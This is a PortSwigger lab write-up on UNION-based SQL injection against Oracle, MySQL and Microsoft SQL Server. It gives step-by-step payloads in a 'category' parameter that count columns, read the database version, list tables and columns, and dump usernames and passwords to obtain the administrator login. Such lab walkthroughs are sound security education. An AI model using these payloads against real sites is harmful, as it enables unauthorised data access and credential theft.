## Summary
- [Lab7: SQL injection attack, querying the database type and version on Oracle](https://github.com/Sec0gh/Portswigger-Labs/tree/main/SQL%20Injection%20Labs/Examining%20the%20database%20in%20SQL%20injection%20attacks#lab7-sql-injection-attack-querying-the-database-type-and-version-on-oracle)
- [Lab8: SQL injection attack, querying the database type and version on MySQL and Microsoft](https://github.com/Sec0gh/Portswigger-Labs/tree/main/SQL%20Injection%20Labs/Examining%20the%20database%20in%20SQL%20injection%20attacks#lab8-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)
- [Lab9: SQL injection attack, listing the database contents on non-Oracle databases](https://github.com/Sec0gh/Portswigger-Labs/tree/main/SQL%20Injection%20Labs/Examining%20the%20database%20in%20SQL%20injection%20attacks#lab9-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
- [Lab10: SQL injection attack, listing the database contents on Oracle](https://github.com/Sec0gh/Portswigger-Labs/tree/main/SQL%20Injection%20Labs/Examining%20the%20database%20in%20SQL%20injection%20attacks#lab10-sql-injection-attack-listing-the-database-contents-on-oracle)

### Lab7: SQL injection attack, querying the database type and version on Oracle
> 1. **If we will test an oracle database, we must use a `dual` special table during selecting null values because it will get an error if we selected anything even if it was the right thing for a number of columns.** 
> 2. **`dual` table used for evaluating expressions or calling functions.**
- Check out: [oracle-dual-table](https://www.oracletutorial.com/oracle-basics/oracle-dual-table/)
- Check out: [docs.oracle.com](https://docs.oracle.com/cd/B19306_01/server.102/b14200/queries009.htm)
- We will track our methodology and test in the first the number of columns used in the query of the application:

```
category=' UNION SELECT null,null from dual--
```
- After detecting there are 2 columns, We found a column that has a string data type:

```
category=' UNION SELECT 'test',null from dual--
```
- A simple proof-of-concept test is to extract the version string of the database, which can be done on any DBMS.
- This injected query will achieve that.
```
category=' UNION SELECT banner,null from v$version--
```

![lab7.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab7.png)
- There is another way to extract the version of the oracle database.

```
category=' UNION SELECT version,null from v$instance--
```

![lab7_version.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab7_version.png)

-----------------------------------------------------------------------

### Lab8: SQL injection attack, querying the database type and version on MySQL and Microsoft
> **`Note` In MySQL syntax query you must add the space after the double dash during the comment so I suggest using URL encoding to obfuscate it when you inject your payload with `--` but also you can use `#` to comment.**
 
 - Check out: [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

- Test the number of columns for `MySQL` or `Microsoft SQL Server` database.
```
category=' UNION SELECT null,null--
category=' UNION SELECT null,null#
```
- Test which one of them is a text column and you will find the 2 columns receive a string value.
```
category=' UNION SELECT 'test','test'-- 
category=' UNION SELECT 'test','test'#
```
- Extract the version in any column of them.
```
category=' UNION SELECT @@version,null--
category=' UNION SELECT @@version,null#
```

![lab8_space.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab8_space.png)

-----------------------------------------------------------------------

### Lab9: SQL injection attack, listing the database contents on non-Oracle databases
- To extract any data from the database, we need to know two essential things:
	1. The name of the table you will return data from.
	2. The name of columns for this table which you will select.
- But how can we do that without knowing them?
	- We can use the `information_schema` database, It is designed to hold database metadata and provide information about the database.
	- It is supported by MS-SQL, MySQL, and many other databases other than `Oracle`.
	- Now we can know the names of the database tables and columns from `information_schema`.

- Here as we used to start with testing the number of columns and their data type.
```
category=' union select null,null from information_schema.tables--
category=' union select 'test','test' from information_schema.tables--
```
- We try to selects the columns from table is called `tables`.
- So in the first, we will try to extract the names of the tables for the database.

```
category=' union select table_name,null from information_schema.tables--
```

![lab9_table_name.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab9_table_name.png)

- We will find an interesting table called `users_(random_characters)`, so now we can try to extract the name of columns from the `columns` table but we will identify the table name which we need to return its columns in the query.
```
category=' union select column_name,null from information_schema.columns where table_name='users_vlfwzh'--
```

![lab9_column_name.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab9_column_name.png)

- The query retrieved two columns, and now the last phase is extracting the data of usernames and passwords from the `users` table.
```
category=' union select username_cluojr, password_fkpkqk from users_vlfwzh--
```

![lab9.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab9.png)

- We got the administrator password, and we can log in with it. 
-----------------------------------------------------------------------

### Lab10: SQL injection attack, listing the database contents on Oracle
- Here we will test the number of columns and their data type by using `dual` table because it is an oracle database, and if you tried to test without this table, you will get an error.

```
category=' union select null,null from dual--
category=' union select 'test','test' from dual--
```
- Oracle doesn’t support the `information_schema` but it provides `all_tables` data dictionary which we can query to list all tables in oracle.

```
category=' union select table_name,null from all_tables--
```

![lab10_table_name.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab10_table_name.png)

- After listing all tables, we will go to list all columns in the `users_(random_characters)` table but we will use the `all_tab_columns` table to retrieve information about columns in the database.

```
category=' union select column_name,null from all_tab_columns where table_name='USERS_ZXHNHP'--
```

![lab10_column_name.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab10_column_name.png)

- Finally, we will extract the data of usernames and passwords.

```
category=' union select USERNAME_EXOKDN, PASSWORD_YEICFS from USERS_ZXHNHP--
```

![lab10.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab10.png)
- Nice, we got the administrator password.

![I got you](https://c.tenor.com/gJto5WLSSVEAAAAC/the-batman-penguin.gif)
